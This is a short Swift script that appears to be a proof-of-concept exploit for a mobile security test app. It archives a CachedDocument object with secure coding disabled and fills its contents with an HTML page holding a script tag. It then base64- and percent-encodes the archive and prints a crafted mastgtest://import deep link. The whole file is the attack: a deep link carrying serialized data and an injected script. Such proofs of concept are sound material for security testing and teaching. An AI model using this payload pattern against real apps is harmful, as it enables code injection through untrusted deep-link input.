import Foundation
@objc(CachedDocument) class CachedDocument: NSObject, NSSecureCoding {
    static var supportsSecureCoding: Bool { true }
    let fileName: String; let contents: String
    init(fileName: String, contents: String){self.fileName=fileName;self.contents=contents;super.init()}
    func encode(with c: NSCoder){c.encode(fileName,forKey:"fileName");c.encode(contents,forKey:"contents")}
    required convenience init?(coder c: NSCoder){self.init(fileName:"",contents:"")}
}
let html = #"<!doctype html><html><body><h1>Pwned via deep link</h1><script>alert("pwned via link")</script></body></html>"#
let evil = try! NSKeyedArchiver.archivedData(withRootObject: CachedDocument(fileName: "pwned_via_link.html", contents: html), requiringSecureCoding: false)
let allowed = CharacterSet.urlQueryAllowed.subtracting(CharacterSet(charactersIn: "+/="))
let payload = evil.base64EncodedString().addingPercentEncoding(withAllowedCharacters: allowed)!
print("mastgtest://import?session=\(payload)")